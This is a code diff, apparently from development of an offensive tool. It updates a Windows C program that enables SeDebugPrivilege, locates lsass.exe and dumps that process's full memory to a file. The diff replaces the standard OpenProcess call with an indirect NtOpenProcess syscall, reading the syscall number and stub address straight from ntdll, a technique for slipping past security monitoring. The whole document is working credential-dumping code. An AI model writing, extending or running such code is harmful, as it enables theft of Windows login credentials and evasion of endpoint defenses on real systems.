@@ -2,14 +2,20 @@
 #include <processthreadsapi.h>
 #include <dbghelp.h>
 #include <tlhelp32.h>
+#include <winternl.h>
 #include <iostream>
 #include <shlwapi.h>
+#include "syscalls.h"
 #pragma comment(lib, "dbghelp.lib")
 #pragma comment(lib, "shlwapi.lib")
 
 // int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR
 // lpCmdLine, int nCmdShow) {
 //
+
+DWORD wNtOpenProcess;
+UINT_PTR sysAddrNtOpenProcess;
+
 int FindTarget(const char* procname) {
         HANDLE hProcSnap;
         PROCESSENTRY32 pe32;
@@ -43,28 +49,18 @@ int FindTarget(const char* procname) {
 
         return pid;
 }
-static void PrintLastError(const char* where) {
-        DWORD e = GetLastError();
-        char* msg = NULL;
-        FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM |
-                           FORMAT_MESSAGE_IGNORE_INSERTS,
-                       NULL, e, 0, (LPSTR)&msg, 0, NULL);
-        printf("%s failed: %lu (%s)\n", where, e, msg ? msg : "no message");
-        if (msg)
-                LocalFree(msg);
-}
 
 BOOL setPrivilege(LPCTSTR privilegeName) {
         HANDLE hToken = NULL;
         if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                               &hToken)) {
-                PrintLastError("OpenProcessToken");
+                printf("OpenProcessToken failed");
                 return FALSE;
         }
 
         LUID luid;
         if (!LookupPrivilegeValueA(NULL, privilegeName, &luid)) {
-                PrintLastError("LookupPrivilegeValue");
+                printf("LookupPrivilegeValue failed");
                 CloseHandle(hToken);
                 return FALSE;
         }
@@ -76,17 +72,13 @@ BOOL setPrivilege(LPCTSTR privilegeName) {
 
         SetLastError(0);
         if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
-                PrintLastError("AdjustTokenPrivileges");
+                printf("AdjustTokenPrivileges failed");
                 CloseHandle(hToken);
                 return FALSE;
         }
-
-        // Important: AdjustTokenPrivileges can succeed but the privilege is not assigned.
         DWORD e = GetLastError();
         if (e == ERROR_NOT_ALL_ASSIGNED) {
-                printf("AdjustTokenPrivileges: privilege '%s' not assigned to this token (run as "
-                       "admin?)\n",
-                       privilegeName);
+                printf("failed");
                 CloseHandle(hToken);
                 return FALSE;
         }
@@ -103,25 +95,47 @@ int main(void) {
         printf("SeDebugPrivilege enabled\n");
 
         const char* procname = "lsass.exe";
+        // const char* procname = "notepad.exe";
 
         int pid = FindTarget(procname);
+
+        printf("PID: %u\n", pid);
+
+        // Trying Indirect Syscall for OpenProcess
+        // Get the handle of NTDLL
+        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+
+        // Get the addr of the target function
+        UINT_PTR pNtOpenProcess = (UINT_PTR)GetProcAddress(hNtdll, "NtOpenProcess");
+
+        // Here we read the syscall number
+        // Usually located at the 4th byte of the function
+        wNtOpenProcess = ((unsigned char*)(pNtOpenProcess + 4))[0];
+
+        // Here we directly get the addr of the syscall stub (the actual syscall instruction)
+        // This is the diff between direct and indirect syscall
+        sysAddrNtOpenProcess = pNtOpenProcess + 0x12;
+
+        CLIENT_ID cid = {(HANDLE)(ULONG_PTR)pid, NULL};
+        OBJECT_ATTRIBUTES oa;
+        InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
+
+        HANDLE hLsass = NULL;
+        NtOpenProcess(&hLsass, PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ, &oa, &cid);
+
+        if (!hLsass) {
+                printf("OpenProcess failed: %lu\n", GetLastError());
+        }
 
         // Create a new file and get its handle
         HANDLE hFile = CreateFileA("lsass.dmp", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                                    FILE_ATTRIBUTE_NORMAL, NULL);
         if (hFile == INVALID_HANDLE_VALUE) {
                 printf("CreateFile failed: %lu\n", GetLastError());
+                CloseHandle(hLsass);
         }
 
-        printf("PID: %u\n", pid);
-
-        HANDLE hLsass = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ, 0, pid);
-
-        if (!hLsass) {
-                printf("OpenProcess failed: %lu\n", GetLastError());
-                CloseHandle(hFile);
-        }
-
+        printf("Trying to dump the process memory...\n");
         BOOL dump = MiniDumpWriteDump((HANDLE)hLsass, (DWORD)pid, (HANDLE)hFile,
                                       MiniDumpWithFullMemory, NULL, NULL, NULL);
 
